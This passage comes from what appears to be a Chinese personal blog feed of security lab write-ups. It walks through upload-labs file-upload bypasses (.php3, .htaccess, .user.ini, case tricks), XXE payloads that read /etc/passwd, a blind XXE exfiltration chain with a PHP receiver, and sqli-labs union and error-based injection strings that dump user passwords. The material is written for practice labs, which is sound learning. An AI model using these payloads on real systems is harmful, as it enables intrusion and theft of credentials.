alt="img"></p><p>菜刀连接成功</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image016.jpg" alt="img"></p><h2 id="pass-3"><a class="markdownIt-Anchor" href="#pass-3"></a> Pass-3</h2><p>这里发现使用上面方法已经不行了，上传之后会被提示不允许上传asp，aspx，php，jsp后缀文件，应该是黑名单过滤</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image018.jpg" alt="img"></p><p>关于Apache服务器的一些绕过知识：</p><p>可以上传例如php3, phtml后缀的文件绕过，前提是Apache的httpd.conf中配置有如下代码:</p><p>AddType application/x-httpd-php .php .php3 .phtml</p><p>服务器会将.php3, .phtml后缀的文件当成.php解析</p><p>所以尝试上传.php3的文件</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image020.jpg" alt="img"></p><p>可以看到成功上传了</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image022.jpg" alt="img"></p><p>不过这里会被重命名</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image024.jpg" alt="img"></p><p>用菜刀能连接上</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image026.jpg" alt="img"></p><h2 id="pass-4"><a class="markdownIt-Anchor" href="#pass-4"></a> Pass-4</h2><p><strong>注：这里需要5.6版本以下且未开启nts的php</strong></p><p>查看源码，还是黑名单过滤，发现过滤了大多数文件名</p><p>$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);</p><p>但是没有过滤.htaccess文件</p><p><strong>.htaccess****文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置</strong>。</p><p>就是说，我们只要能上传这个文件，就可以改变相应目录下的文件配置</p><p>首先上传一个.htaccess文件内容为</p><p>SetHandler application/x-httpd-php</p><p>作用是使所有文件都被解析成PHP</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image028.jpg" alt="img"></p><p>抓包把文件名改为.htaccess</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image030.jpg" alt="img"></p><p>这时应该成功上传了</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image0322.jpg" alt="img"></p><p>然后尝试上传一个jpg的马</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image034.jpg" alt="img"></p><p>菜刀连接不上，但是这个jpg是确实可以解析成php的，把jpg内容修改为如下，重新上传</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image036.jpg" alt="img"></p><p>这个时候访问就可以看到jpg已经被解析为php了</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image038.jpg" alt="img"></p><h2 id="pass-5"><a class="markdownIt-Anchor" href="#pass-5"></a> Pass-5</h2><p>查看源码过滤了.htaccess文件，而提示是上传目录存在readme.php文件</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image040.jpg" alt="img"><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image042.jpg" alt="img"></p><p>这里我们用到一个.user.ini的文件，.user.ini实际上就是一个可以由用户“自定义”的php.ini，而有些配置项可以用来利用，比如auto_append_file，可以指定一个文件，自动包含在要执行的文件前，所以我们先上传一个名为.user.ini的文件，内容是auto_prepend_file=1.gif</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image044.jpg" alt="img"></p><p>然后我们上传一个1.gif的文件，内容为</p><?php phpinfo(); ?><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image046.jpg" alt="img"></p><p>当我们访问readme.php时，就可以调用1.gif的内容了</p><p>如下，可以看到这里1.gif中的phpinfo函数被调用了</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image048.jpg" alt="img"></p><h2 id="pass-6"><a class="markdownIt-Anchor" href="#pass-6"></a> Pass-6</h2><p>这里查看源码，里面相对pass-4少了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><msub><mi>e</mi><mi>e</mi></msub><mi>x</mi><mi>t</mi><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>t</mi><mi>o</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>r</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">file_ext = strtolower(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span></span></span></span>file_ext); //转换为小写</p><p>这段代码，尝试采用.phP格式上传绕过</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image050.jpg" alt="img"></p><p>这里上传成功了</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image052.jpg" alt="img"></p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image054.jpg" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE 漏洞学习</title>
    <link href="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="xxe-漏洞学习"><a class="markdownIt-Anchor" href="#xxe-漏洞学习"></a> XXE 漏洞学习</h1><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p>XXE注入是一种Web安全漏洞，它使攻击者能够干扰应用程序处理XML数据的方式。成功利用漏洞可以使攻击者查看应用程序服务器中的文件，并与应用程序可以访问的任何外部或后端系统进行交互。</p><h3 id="xml格式"><a class="markdownIt-Anchor" href="#xml格式"></a> XML格式</h3><p>XML代表可扩展标记语言，它像HTML，有一个树状的标签和数据结构，但XML没有预定义的标记，如h1，img，div，等; 标签是根据其表示的数据自定义命名的。</p><h3 id="xml实体"><a class="markdownIt-Anchor" href="#xml实体"></a> XML实体</h3><p>XML实体是一种表示XML文档中的数据项的方式，而不是使用数据本身。将其视为编程中的变量。</p><h3 id="文件类型定义dtd"><a class="markdownIt-Anchor" href="#文件类型定义dtd"></a> 文件类型定义（DTD）</h3><p>它包含可以定义XML文档的结构，可以包含的数据值的类型以及其他项目的声明。DTD可以完全独立于XML文档中（称为内部DTD），也可以从其他位置加载（称为外部DTD）。DTD（DOCTYPE）在XML文档开头的元素内声明。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE name_for_doctype[ &#123;some_data_here&#125; ]&gt;<br></code></pre></td></tr></table></figure><h3 id="xml自定义实体"><a class="markdownIt-Anchor" href="#xml自定义实体"></a> XML自定义实体</h3><p>自定义实体就像可以在DTD中创建的自定义变量。例如：<!DOCTYPE foo [ <!ENTITY myentity “my entity value" > ]&gt;。这里对实体的任何引用&amp;myentity;都将替换为数据“ my entitiy value&quot;。因此，知道我们可以创建自定义实体后，便可以使用来自应用程序服务器的预定义数据来创建一个自定义实体。</p><h3 id="xml外部实体"><a class="markdownIt-Anchor" href="#xml外部实体"></a> XML外部实体</h3><p>XML外部实体是一种自定义实体，其定义位于声明它们的DTD之外。</p><p>外部实体的声明使用SYSTEM关键字，并且必须指定一个URL，应从该URL加载实体的值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM “http:&#x2F;&#x2F;attacker-controlled-site.com&quot; &gt; ]&gt;<br></code></pre></td></tr></table></figure><p>也可以使用其他协议，除了http如file。因此，我们可以从服务器/etc/passwd文件中提取数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM “file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt; ]&gt;<br></code></pre></td></tr></table></figure><h2 id="domdocumentphp"><a class="markdownIt-Anchor" href="#domdocumentphp"></a> DOMDocument.php</h2><p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image002.jpg" alt="img"></p><p>打开网页看到默认带了一段xml示例代码，这个DOCTYPE中已经有SYSTEM关键字，引用服务器的外部实体然后通过&amp;content使用这个实体检索数据</p><p>我们的payload可以写成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE PAYLOAD [<br>  &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;<br>]&gt;<br>  &lt;payload&gt;&amp;xxe;&lt;&#x2F;payload&gt;<br></code></pre></td></tr></table></figure><p>可以成功读取服务器的passwd文件</p><p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image004.jpg" alt="img"></p><h2 id="simplexmlelementphp"><a class="markdownIt-Anchor" href="#simplexmlelementphp"></a> SimpleXMLElement.php</h2><p>查看源码，发现只是把读取的函数换成<code>SimpleXMLElement($data, LIBXML_NOENT)</code></p><p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image006.jpg" alt="img"></p><p>发现原来的payload依然可以用</p><p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image008.jpg" alt="img"></p><p>Payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE PAYLOAD [<br>  &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;<br>]&gt;<br>  &lt;payload&gt;&amp;xxe;&lt;&#x2F;payload&gt;<br></code></pre></td></tr></table></figure><h2 id="simplexml_load_stringphp"><a class="markdownIt-Anchor" href="#simplexml_load_stringphp"></a> simplexml_load_string.php</h2><p>查看源码，发现也只改了读取xml的函数为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mi>m</mi><mi>l</mi><mo>=</mo><mi>s</mi><mi>i</mi><mi>m</mi><mi>p</mi><mi>l</mi><mi>e</mi><mi>x</mi><mi>m</mi><msub><mi>l</mi><mi>l</mi></msub><mi>o</mi><mi>a</mi><msub><mi>d</mi><mi>s</mi></msub><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">xml = simplexml_load_string(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">m</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">o</span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span></span></span></span>data, ‘SimpleXMLElement’, LIBXML_NOENT);</p><p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image010.jpg" alt="img"></p><p>使用原来的payload依然可以读取到密码</p><p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image012.jpg" alt="img"></p><p>Payload为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">PAYLOAD</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">payload</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">payload</span>&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="blindxxephp"><a class="markdownIt-Anchor" href="#blindxxephp"></a> BlindXXE.php</h2><p>打开网页，根据名字提示应该是xxe盲注，百度一下发现这个如果要远程执行需要一个公网ip（前3个都是在github远程环境进行实验），所以这次在本地实验。</p><p>首先在需要接收密码的服务器端写一个PHP如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$file_name</span> = <span class="hljs-string">&quot;passwd.txt&quot;</span>;<br><span class="hljs-variable">$file_tmp</span> = fopen(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;a+&quot;</span>);<br><span class="hljs-variable">$data</span> .= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xxe&#x27;</span>];<br>fwrite(<span class="hljs-variable">$file_tmp</span>,<span class="hljs-variable">$data</span>);<br>fclose(<span class="hljs-variable">$file_tmp</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后建立一个dtd文件内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % xxe &quot;&lt;!ENTITY &amp;#x25; s SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;phpaudit-XXE-master&#x2F;1.php?xxe&#x3D;%d;&#39;&gt; &quot;&gt;<br></code></pre></td></tr></table></figure><p>最后payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[  &lt;!ENTITY % r SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;phpaudit-XXE-master&#x2F;get.dtd&quot;&gt;  &lt;!ENTITY % d SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;phpaudit-XXE-master&#x2F;etc&#x2F;passwd&quot;&gt;  %r;  %s;]&gt; <br></code></pre></td></tr></table></figure><p>效果如下</p><p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image014.jpg" alt="img"></p><p>虽然页面会有报错，但是我们的远端服务器确实可以接收到passwd的base64编码</p><p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image016.jpg" alt="img"></p><p>也可以进行解码出密码</p><p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image018.jpg" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli labs master 学习</title>
    <link href="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs-master-学习"><a class="markdownIt-Anchor" href="#sqli-labs-master-学习"></a> sqli labs master 学习</h1><h2 id="less-1"><a class="markdownIt-Anchor" href="#less-1"></a> Less 1</h2><p>1.首先判断注入点</p><p>在http请求后加上？id=1’ and 1=1 – -，显示如下</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image002.jpg" alt="img"></p><p>把后面改为1=2显示如下，可以看到sql语句应该是正常执行了，没有报错</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image004.jpg" alt="img"></p><p>可以说明存在字符型注入，猜测语句为select… where id=’’这样的语句。</p><p>接下来判断注入点</p><p>判断字段数</p><p>输入?id=1’ order by 3 – -时候会显示如下，说明内部字段数为3</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image006.jpg" alt="img"></p><p>输入?id=0’ union select 1,2,3 – -回显如下</p><p>（id为0是为了不让返回值干扰注入）</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image008.jpg" alt="img"></p><p>说明2,3的位置存在注入点</p><p>使用联合查询注入查看表，输入?id=0’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() – -回显如下</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image010.jpg" alt="img"></p><p>得到emails,referers,uagents,users这几个表</p><p>查询字段，输入?id=0’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=‘users’ – -回显如下</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image012.jpg" alt="img"></p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image014.jpg" alt="img"></p><p>发现里面有username，password字段，可以尝试查询这个列里的值，输入?id=0’ union select 1,group_concat(username,0x3f,password),3 from users-- -</p><p>0x3f是？的ascii码值，放在中间作为参数好区分两个列的值</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image016.jpg" alt="img"></p><h2 id="less-2"><a class="markdownIt-Anchor" href="#less-2"></a> Less 2</h2><p>首先查看注入类型，输入?id=1 and 1=1 – -回显如下</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image072.jpg" alt="img"></p><p>输入?id=1 and 1=2 – -回显如下</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image074.jpg" alt="img"></p><p>说明存在数字型注入，之后步骤同less1，输入的代码相同，如下</p><p>判断注入点，输入?id=1 order by 3 – -</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imag06.jpg" alt="img"></p><p>回显如下，说明回显字段数为3，之后步骤同less1，可以使用less1的注入代码去掉前面单引号即可</p><p>最后输入输入?id=0 union select 1,group_concat(username,0x3f,password),3 from users-- -得到用户名和密码</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image708.jpg" alt="img"></p><h2 id="less-3"><a class="markdownIt-Anchor" href="#less-3"></a> Less 3</h2><p>先输入?id=1’，显示如下，根据报错信息，可以知道后面还有个括号，所以尝试输入?id=1’) and 1=1 – -</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image22.jpg" alt="img"></p><p>输入?id=1’) and 1=1 – -回显如下</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image044.jpg" alt="img"></p><p>说明存在基于字符’)的字符型注入</p><p>输入?id=1’) order by 3 – -回显如下，说明返回数据有3个字段</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imaw006.jpg" alt="img"></p><p>后面输入同less1，将less1的语句改为id=1’)即可</p><p>最后输入?id=0 union select 1,group_concat(username,0x3f,password),3 from users-- -得到用户名和密码列对应的数值</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_ima008.jpg" alt="img"></p><h2 id="less-4"><a class="markdownIt-Anchor" href="#less-4"></a> Less 4</h2><p>输入?id=1’但是页面无变化</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_i.jpg" alt="img"></p><p>输入?id=1&quot;页面报错如下，猜测可能是双引号加）</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_ima.jpg" alt="img"></p><p>输入?id=1&quot;) order by 4 – -发现回显如下，说明我们的判断可能是对的</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imag76.jpg" alt="img"></p><p>输入?id=1&quot;) order by 3 – -回显正常说明有3个字段</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_ie008.jpg" alt="img"></p><p>之后注入代码同less1，id后面改为&quot;)其他同，最后得到用户名和密码的列内容为</p><p>输入</p><p>?id=0&quot;) union select 1,group_concat(username,0x3f,password),3 from users-- -得到用户名和密码列对应的数值</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_im.jpg" alt="img"></p><h2 id="less-5"><a class="markdownIt-Anchor" href="#less-5"></a> Less 5</h2><p>首先查询id=1，但是发现不会返回任何数据，只会返回you are in……</p><p>如果输入别的，就会报错</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image34.jpg" alt="img"></p><p>输入?id=1’ and 1=1 – -未报错，说明sql查询语句可能同less1使用‘号闭合</p><p>输入?id=1’ order by 3 – -，回显正常，说明字段数为3</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_ima344.jpg" alt="img"><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imageqew.jpg" alt="img"></p><p>使用报错注入查询数据库名，输入?id=0’union select count(*),1, concat(’~’,(select database()),’~’,floor(rand()*2)) as a from information_schema.tables group by a – -</p><p>原理：利用concat（）连接函数和随机数函数floor(rand()*2)的结果只能在0-1来产生报错，使用information_schema.tables 或 information_schema.columns者两个表来查询，然后就会产生很多结果达到报错concat函数加~号是为了能更好看清楚查询到的数据库</p><p>效果如下：可以知道查询到的数据库名是security</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_im0.jpg" alt="img"></p><p>查询表名，输入</p><p>?id=0’ union select count(*),1, concat(’~’,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),’~’,floor(rand()*2)) as a from information_schema.tables group by a – -</p><p>从0开始输入到4的时候（limit 3，1前的数3表示第几个表），回显如下</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_im10.jpg" alt="img"></p><p>说明数据库中第四个表为user</p><p>查询列字段名，输入?id=0’ union select count(*),1, concat(’~’,(select column_name from information_schema.columns where table_schema=‘security’ and table_name=‘users’ limit 0,1),’~’, floor(rand()*2)) as a from information_schema.tables group by a – -</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_im1.jpg" alt="img"></p><p>说明表中第一个列的字段是id，同理可以找到username、password等字段</p><p>接下来查询内容，输入?id=0’ union select count(*),1, concat(’~’,( select username from users limit 1,1),’~’, floor(rand()*2)) as a from information_schema.tables group by a – -</p><p>和</p><p>?id=0’ union select count(*),1, concat(’~’,( select password from users limit 1,1),’~’, floor(rand()*2)) as a from information_schema.tables group by a – -</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image088.jpg" alt="img"></p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image8016.jpg" alt="img"></p><p>可以查找到Angelina的用户名和密码，查找其他账号密码方式同上</p><h2 id="less-6"><a class="markdownIt-Anchor" href="#less-6"></a> Less 6</h2><p>输入id=1回显如下，说明还是通过布尔值来判断注入</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image3002.jpg" alt="img"></p><p>尝试输入?id=1’，回显如下</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image0044.jpg" alt="img"></p><p>输入?id=1&quot;报错如下</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image00634.jpg" alt="img"></p><p>说明存在双引号的注入</p><p>使用报错注入查询数据库名，输入?id=0” union select count(*),1, concat(’~’,(select database()),’~’,floor(rand()*2)) as a from information_schema.tables group by a – -</p><p><img 